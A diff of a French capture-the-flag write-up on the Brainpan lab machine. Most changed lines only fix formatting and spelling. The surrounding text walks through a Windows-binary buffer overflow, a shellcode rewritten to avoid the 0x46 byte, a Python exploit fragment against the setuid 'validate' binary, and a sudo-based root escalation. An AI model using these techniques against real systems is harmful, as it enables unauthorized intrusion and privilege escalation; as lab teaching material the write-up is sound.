@@ -66,7 +66,7 @@ response:                           ACCESS GRANTED
 
 Seulement quand on s'y connecte l'expérience est de courte durée :  
 
-```bash
+```console
 $ ncat 192.168.1.43 9999 -v
 Ncat: Version 6.01 ( http://nmap.org/ncat )
 Ncat: Connected to 192.168.1.43:9999.
@@ -129,7 +129,7 @@ Register dump:
 
 Il nous faut donc 516 + 8 = 524 octets avant d’écraser EIP. On relance en mettant 524 A puis 4 D. On en profite pour regarder plus en détails l'état de la stack et des registres via *winedbg* dont les commandes sont similaires à *gdb* :  
 
-```bash
+```console
 $ winedbg ./brainpan.exe 
 fixme:service:scmdatabase_autostart_services Auto-start service L"PGPsdkDriver" failed to start: 2
 fixme:service:scmdatabase_autostart_services Auto-start service L"PGPsdkServ" failed to start: 2
@@ -169,9 +169,9 @@ AAAAAAAAAAAAAAAA---snip---AAAAAAAAAAAAAAAA
 
 Cool ! Le second dword sur la stack est un pointeur vers le début du buffer.  
 
-Si on veut faire un exploit stable il suffit de trouver dans le code une instruction pop-ret qui dépile le premier dword et saute vers le buffer.  
+Si on veut faire un exploit stable il suffit de trouver dans le code une instruction `pop-ret` qui dépile le premier dword et saute vers le buffer.  
 
-Avec *ROPgadget* (*./ROPgadget.py --binary ../brainpan.exe*) on obtient rapidement ce que l'on souhaite (*0x311712f8 : pop ebx ; ret*)  
+Avec *ROPgadget* (`./ROPgadget.py --binary ../brainpan.exe`) on obtient rapidement ce que l'on souhaite (`0x311712f8 : pop ebx ; ret`)  
 
 On vérifie cela en plaçant des 0xCC (sigtrap) dans le buffer qui seront attrapées par le débugger si on saute effectivement dessus :  
 
@@ -247,7 +247,7 @@ sock.close()
 
 ![Connect back](/assets/img/brainpan_1/connect_back.png)
 
-A ma grande surprise on peut faire exécuter des commandes linux depuis l'invite de commande récupérée (j'ai testé préalablement sur ma machine et ça ne fonctionnait pas).  
+À ma grande surprise, on peut faire exécuter des commandes linux depuis l'invite de commande récupérée (j'ai testé préalablement sur ma machine et ça ne fonctionnait pas).  
 
 ![Linux command from wine](/assets/img/brainpan_1/linux_wine.png)
 
@@ -292,9 +292,9 @@ anansi:x:1001:1001:Anansi,,,:/home/anansi:/bin/bash
 puck:x:1002:1002:Puck,,,:/home/puck:/bin/bash
 ```
 
-L'utilisateur *Puck* sur lequel on a la main a le droits d'exécuter une commande en tant que root... mais on ne dispose d'aucun accès au binaire :'(  
+L'utilisateur *Puck*, sur lequel on a la main, a le droit d'exécuter une commande en tant que root... mais on ne dispose d'aucun accès au binaire :'(  
 
-```bash
+```console
 puck@brainpan:~$ sudo -l
 Matching Defaults entries for puck on this host:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -303,17 +303,17 @@ User puck may run the following commands on this host:
     (root) NOPASSWD: /home/anansi/bin/anansi_util
 ```
 
-On se rencarde donc sur *anansi* qui est notre nouveau meilleur ennemi :  
+On se rencarde donc sur `anansi` qui est notre nouveau meilleur ennemi :  
 
-```bash
+```console
 puck@brainpan:~$ find / -user anansi 2> /dev/null
 /usr/local/bin/validate
 /home/anansi
 ```
 
-Le binaire *validate* est setuid de cet utilisateur. A l'attaque !  
+Le binaire `validate` est setuid de cet utilisateur. À l'attaque !  
 
-```bash
+```console
 puck@brainpan:~$ /usr/local/bin/validate
 usage /usr/local/bin/validate <input>
 puck@brainpan:~$ /usr/local/bin/validate test
@@ -328,7 +328,7 @@ dynamically linked (uses shared libs), for GNU/Linux 2.6.15,
 BuildID[sha1]=c4b7d3019dda6ebc259c4e4b63a336e00a63b949, not stripped
 ```
 
-*nm* fait état d'une fonction *validate* ainsi que de l'utilisation de fonctions connues :  
+`nm` fait état d'une fonction `validate` ainsi que de l'utilisation de fonctions connues :  
 
 ```
 08048538 T main
@@ -340,7 +340,7 @@ BuildID[sha1]=c4b7d3019dda6ebc259c4e4b63a336e00a63b949, not stripped
 080484b4 T validate
 ```
 
-Le main est très simple :  
+Le `main` est très simple :  
 
 ```nasm
    0x0804856c <+52>:    call   0x80483cc <printf@plt>
@@ -359,7 +359,7 @@ Le main est très simple :
    0x0804859e <+102>:   ret
 ```
 
-Quand à la fonction validate :  
+Quant à la fonction `validate` :  
 
 ```nasm
 Dump of assembler code for function validate:
@@ -410,34 +410,34 @@ S'il rencontre un caractère F alors le programme quittera en disant que la vali
 
 En revanche si aucun *F* n'est trouvé alors le programme passe la validation et recopie la chaîne dans un buffer.  
 
-Si on passe la chaine *"A" \* 112 + "B" \*4 + "C" \* 4* (toujours du Python) on retrouve *CCCC* dans eip et *BBB* dans ebp.  
+Si on passe la chaine `"A" * 112 + "B" *4 + "C" * 4` (toujours du Python) on retrouve `CCCC` dans `eip` et `BBB` dans `ebp`.  
 
-Cette fois c'est le registre eax qui pointe vers notre chaîne :  
+Cette fois, c'est le registre eax qui pointe vers notre chaîne :  
 
 ```
 (gdb) x/s $eax
 0xffffcf48:     'A' <repeats 112 times>, "BBBBCCCC"
 ```
 
-Il nous faut donc une adresse de retour de type *jmp eax* ou *call eax* ce qui s'obtient facilement avec *objdump* (*objdump -D validate | grep call*).  
+Il nous faut donc une adresse de retour de type `jmp eax` ou `call eax` ce qui s'obtient facilement avec `objdump` (`objdump -D validate | grep call`).  
 
-En l'occurence il y a deux *call eax*, l'un en *080484af*, l'autre en *0804862b*.  
+En l'occurrence il y a deux `call eax`, l'un en `080484af`, l'autre en `0804862b`.  
 
-La randomisation étant activée c'est bien la solution à prendre.  
+La randomisation étant activée, c'est bien la solution à prendre.  
 
-Maintenant, le point important c'est que le shellcode ne doit pas contenir de caractère F (0x46).  
+Maintenant, le point important, c'est que le shellcode ne doit pas contenir de caractère F (0x46).  
 
-0x46 correspond à l'instruction assembleur *inc esi* et à un niveau plus général 0x46 est utilisé comme base pour presque toutes les opérations concernant esi (pour résumer 0x46 = esi).  
+0x46 correspond à l'instruction assembleur `inc esi` et à un niveau plus général 0x46 est utilisé comme base pour presque toutes les opérations concernant esi (pour résumer 0x46 = esi).  
 
 Il nous faut donc un shellcode qui n'utilise pas ce registre.  
 
-Mais l'auteur du challenge n'a pas choisi la valeur 0x46 au hasard : c'est aussi le code attribué à *sys\_setreuid* pour les syscalls...  
+Mais l'auteur du challenge n'a pas choisi la valeur 0x46 au hasard : c'est aussi le code attribué à `sys_setreuid` pour les syscalls...  
 
 J'ai choisi [un shellcode qui effectue un setreuid de getuid](http://www.shell-storm.org/shellcode/files/shellcode-399.php) (ça fonctionne pour tous les binaires setuid root ou pas).  
 
-Il faut seulement le changer un peu pour qu'à la place de faire le *push 0x46-pop eax* il fasse un *push 0x45-pop eax-inc eax*.  
+Il faut seulement le changer un peu pour qu'à la place de faire le `push 0x46-pop eax` il fasse un `push 0x45-pop eax-inc eax`.  
 
-L'opcode pour *inc eax* est 0x40.  
+L'opcode pour `inc eax` est 0x40.  
 
 J'obtiens alors le shellcode et le code d'exploitation suivant :  
 
@@ -452,14 +452,14 @@ buffer = shellcode + "A" * (116 - len(shellcode)) + ret
 subprocess.call(["/usr/local/bin/validate", buffer])
 ```
 
-Notez qu'au début j'avais mis un nopsled au début puis le shellcode mais le programme tronquait la chaîne en plaçant un octet null aux deux tiers du shellcode provoquant une erreur. Peut-être l'effet d'un compteur écrasé... En plaçant le shellcode au tout début, pas de problèmes :)  
+Notez qu'au début, j'avais mis un nopsled au début puis le shellcode mais le programme tronquait la chaîne en plaçant un octet null aux deux tiers du shellcode provoquant une erreur. Peut-être l'effet d'un compteur écrasé... En plaçant le shellcode au tout début, pas de problèmes :)  
 
 Root 66
 -------
 
 L'accès anansi obtenu, voyons voir ce que fait l'utilitaire mentionné plus tôt :  
 
-```bash
+```console
 anansi@brainpan:/home/anansi$ ./bin/anansi_util
 Usage: ./bin/anansi_util [action]
 Where [action] is one of:
@@ -476,11 +476,11 @@ On trouve les chaines de caractères suivantes dans le binaire :
 /usr/bin/top
 ```
 
-Rien de plus à voir, d'ailleurs peut importe, il nous suffit de le remplacer par bash pour profiter des droits sudo de *Puck*.  
+Rien de plus à voir, d'ailleurs peu importe, il nous suffit de le remplacer par bash pour profiter des droits sudo de *Puck*.  
 
-Le problème venait des droits sur */home/anansi* qui ne nous laissaient pas traverser jusqu'au binaire :  
+Le problème venait des droits sur `/home/anansi` qui ne nous laissaient pas traverser jusqu'au binaire :  
 
-```bash
+```console
 anansi@brainpan:/home/anansi$ ls -ld .
 drwx------ 4 anansi anansi 4096 Mar  4  2013 .
 anansi@brainpan:/home/anansi$ chmod o+rx .
@@ -506,7 +506,7 @@ root@brainpan:~# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Pas de flag mais un fichier avec un ascii art dans */root/b.txt*.  
+Pas de flag mais un fichier avec un ascii art dans `/root/b.txt`.  
 
 Un challenge agréable comme c'était le cas pour la première édition :)
 
